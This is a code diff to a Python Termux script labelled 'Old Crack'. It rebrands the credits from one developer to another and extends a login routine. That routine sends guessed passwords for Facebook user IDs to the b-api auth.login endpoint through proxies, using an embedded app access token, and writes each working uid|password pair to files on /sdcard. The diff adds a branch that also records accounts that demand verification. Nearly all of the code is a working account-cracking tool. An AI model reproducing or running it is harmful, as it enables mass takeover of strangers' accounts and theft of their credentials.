@@ -59,20 +59,11 @@ def windows():
     return random.choice([A,B,C,D])
 #----------------------------[LOGO]-----------------------------------#
 logo = (f"""        
-\033[1;93m┏━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-\033[1;93m┃  \033[1;31m██████  \033[1;32m██   ██ \033[1;33m ┃  \033[38;5;208m██████  \033[1;34m███████ \033[1;35m████████ \033[1;93m┃
-\033[1;93m┃ \033[1;31m██       \033[1;32m██   ██ \033[1;33m ┃ \033[38;5;208m██    ██ \033[1;34m██      \033[1;35m   ██    \033[1;93m┃
-\033[1;93m┃ \033[1;31m██   ███ \033[1;32m███████ \033[1;33m ┃ \033[38;5;208m██    ██ \033[1;34m███████ \033[1;35m   ██    \033[1;93m┃
-\033[1;93m┃ \033[1;31m██    ██ \033[1;32m██   ██ \033[1;33m ┃ \033[38;5;208m██    ██ \033[1;34m     ██ \033[1;35m   ██    \033[1;93m┃
-\033[1;93m┃  \033[1;31m██████  \033[1;32m██   ██ \033[1;33m ┃  \033[38;5;208m██████  \033[1;34m███████ \033[1;35m   ██    \033[1;93m┃
-\033[1;93m┗━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
-\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   :  GHOST KING
-\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FACEBOOK    :  G H O S T 
-\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m GITHUB      :  Ghost3987
-\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m VERSION     :  4.0
+\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   :  SUMON ROY
+\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m VERSION     :  0.0.1
 \033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m TOOL        :  \033[1;34mOld Crack\033[1;32m
 \033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FB GROUP    :  \033[1;91m\033[1;41m\033[1;33mTermux Free Command World 2024\033[;0m\033[1;91m\033[1;92m\033[38;5;46m
+\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FB GROUP    :  \033[1;91m\033[1;41m\033[1;33mNIGERIAN USER SPEACIAL TOOLS \033[;0m\033[1;91m\033[1;92m\033[38;5;46m
 \033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m""")
 #----------------------------[MAIN/DEF]-----------------------------------#
 def main():
@@ -125,13 +116,18 @@ def login(uid):
             "x-fb-http-engine": "Liger"}
             rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers, proxies =proxies).json()
             if "session_key" in rp:
-                print(f"\r\r\033[1;30m[\033[1;33mHASENA\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
-                open("/sdcard/GHOST-OLD-OK","a").write(uid+"|"+pw+"\n")
+                print(f"\r\r\033[1;30m[\033[1;33mOK\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
+                open("/sdcard/SUMON-OLD-OK","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break 
             elif "www.facebook.com" in rp["error_msg"]:
-                print(f"\r\r\033[1;30m[\033[1;33mHASENA\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
-                open("/sdcard/GHOST-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f"\r\r\033[1;30m[\033[1;33mOK\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
+                open("/sdcard/SUMON-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                oks.append(uid)
+                break
+            elif "User must verify their account" in rp:
+                print(f"\r\r\033[1;30m[\033[1;33mOK\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
+                open("/sdcard/SUMON-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
